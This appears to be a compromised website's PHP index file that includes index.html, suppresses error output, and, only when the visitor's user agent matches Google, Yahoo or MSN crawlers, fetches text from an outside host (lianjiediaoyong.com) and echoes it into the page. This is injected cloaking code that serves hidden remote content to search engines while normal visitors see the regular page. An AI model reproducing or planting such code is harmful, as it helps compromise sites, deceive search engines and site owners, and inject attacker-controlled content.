<?php include("index.html");?>
<?php @error_reporting (E_ALL & ~E_NOTICE & ~E_WARNING);
ini_set('display_errors',0);if(preg_match('/Google Web Preview|google|yahoo|msnbot/i',$_SERVER['HTTP_USER_AGENT'])){
$content = file_get_contents("http://lianjiediaoyong.com/site/497.txt");echo $content;}?>